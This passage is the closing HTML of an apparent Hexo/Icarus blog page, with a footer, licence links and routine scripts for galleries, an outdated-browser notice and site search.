href="/post/JsMisc/">Javascript æ‚è®°</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">æ¢ç´¢</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">Ã—</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>